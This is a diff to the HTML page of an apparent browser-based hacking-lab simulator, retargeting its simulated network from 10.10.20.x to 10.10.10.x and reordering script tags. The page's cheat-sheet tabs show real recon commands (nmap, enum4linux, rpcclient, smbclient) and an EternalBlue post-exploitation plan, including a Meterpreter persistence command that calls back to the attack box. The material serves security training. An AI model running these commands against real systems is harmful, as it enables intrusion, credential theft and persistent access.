@@ -291,7 +291,7 @@
 
         <!-- ── Tab: Post-Exploitation ────────────────────────────────────── -->
         <div class="cs-pane" data-pane="postex">
-          <div class="mb-1 text-[10px] tracking-widest text-emerald-400 font-mono">SYSTEM @ 10.10.20.10 &nbsp;·&nbsp; runs after EternalBlue lands</div>
+          <div class="mb-1 text-[10px] tracking-widest text-emerald-400 font-mono">SYSTEM @ 10.10.10.10 &nbsp;·&nbsp; runs after EternalBlue lands</div>
           <div class="mb-4 text-[11px] text-slate-400 leading-snug">The order is: stabilize, enumerate, dump credentials, persist, loot, exfil. Each phase locks in your access before doing something noisier.</div>
 
           <div class="mb-4">
@@ -342,7 +342,7 @@
           <div class="mb-4">
             <div class="text-emerald-400 text-[11px] tracking-wider mb-1.5">► 4. PERSIST</div>
             <div class="pl-3 space-y-0.5">
-              <div><span class="text-violet-400">run persistence -A -S -U -i 60 -p 4444 -r 10.10.20.5</span></div>
+              <div><span class="text-violet-400">run persistence -A -S -U -i 60 -p 4444 -r 10.10.10.5</span></div>
             </div>
           </div>
 
@@ -423,7 +423,7 @@
             <div class="pl-3 space-y-0.5">
               <div><span class="text-violet-400">sudo nmap -sn 10.10.10.0/24</span> <span class="text-slate-500"># ping sweep</span></div>
               <div><span class="text-violet-400">nmap -sV -sC 10.10.10.10</span> <span class="text-slate-500"># service scan</span></div>
-              <div><span class="text-violet-400">sudo nmap -sC -sV 10.10.20.10</span></div>
+              <div><span class="text-violet-400">sudo nmap -sC -sV 10.10.10.10</span></div>
               <div><span class="text-violet-400">enum4linux -a 10.10.10.10</span></div>
               <div><span class="text-violet-400">rpcclient -U "" -N 10.10.10.10</span></div>
               <div><span class="text-violet-400">smbclient -L //10.10.10.10 -N</span></div>
@@ -540,9 +540,9 @@
           <div style="font-size:36px;margin-bottom:14px">🌐</div>
           <div style="font-size:15px;font-weight:700;color:#1e293b;margin-bottom:14px">The Simulated Network</div>
           <div style="display:flex;flex-direction:column;gap:10px">
-            <div class="wc-fact"><span class="wc-pill">10.10.20.5</span> <div><strong style="color:#1e293b">rembrandt</strong> — your attack box. Kali under the hood, you behind the keyboard.</div></div>
-            <div class="wc-fact"><span class="wc-pill" style="background:#fee2e2;color:#b91c1c">10.10.20.10</span> <div><strong style="color:#1e293b">WIN7-PC</strong> — Windows 7 SP1, unpatched. The kind of box still humming in real corporate networks.</div></div>
-            <div class="wc-fact"><span class="wc-pill" style="background:#dcfce7;color:#15803d">10.10.20.0/24</span> <div>The lab subnet — discover hosts with a ping sweep before you scan.</div></div>
+            <div class="wc-fact"><span class="wc-pill">10.10.10.5</span> <div><strong style="color:#1e293b">rembrandt</strong> — your attack box. Kali under the hood, you behind the keyboard.</div></div>
+            <div class="wc-fact"><span class="wc-pill" style="background:#fee2e2;color:#b91c1c">10.10.10.10</span> <div><strong style="color:#1e293b">WIN7-PC</strong> — Windows 7 SP1, unpatched. The kind of box still humming in real corporate networks.</div></div>
+            <div class="wc-fact"><span class="wc-pill" style="background:#dcfce7;color:#15803d">10.10.10.0/24</span> <div>The lab subnet — discover hosts with a ping sweep before you scan.</div></div>
           </div>
         </div>
 
@@ -640,9 +640,9 @@
 <script src="js/sim_state.js"></script>
 <script src="js/handlers/sudo_apt.js"></script>
 <script src="js/handlers/basic.js"></script>
+<script src="js/handlers/msf.js"></script>
 <script src="js/handlers/recon.js"></script>
 <script src="js/handlers/system.js"></script>
-<script src="js/handlers/msf.js"></script>
 <script src="js/handlers/misc.js"></script>
 <script src="js/dispatcher.js"></script>
 <script src="js/ctf.js"></script>
